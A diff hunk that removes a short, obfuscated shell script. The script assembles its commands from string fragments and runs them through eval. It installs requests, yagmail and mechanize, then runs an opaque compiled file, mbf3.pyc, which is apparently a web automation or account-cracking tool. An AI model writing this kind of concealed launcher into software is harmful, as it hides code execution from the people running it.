@@ -1,3 +1,0 @@
-z="
-";Ez='L BA';Az='echo';Cz='NGIN';Oz='ail';Bz=' "ME';Yz='pyth';Uz='SUKS';Tz='HAN ';Iz='all ';Fz='HAN"';Xz='olde';Nz='yagm';Sz=' "IN';Zz='on m';Kz='ests';Dz='STAL';Qz='aniz';bz='pyc';Jz='requ';Pz='mech';Vz='ES"';Rz='e';Mz='r';Wz='cd F';Gz='pip ';az='bf3.';Lz='clea';Hz='inst';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$z$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$z$Gz$Hz$Iz$Nz$Oz$z$Lz$Mz$z$Gz$Hz$Iz$Pz$Qz$Rz$z$Az$Sz$Dz$Ez$Tz$Uz$Vz$z$Lz$Mz$z$Wz$Xz$Mz$z$Lz$Mz$z$Yz$Zz$az$bz"
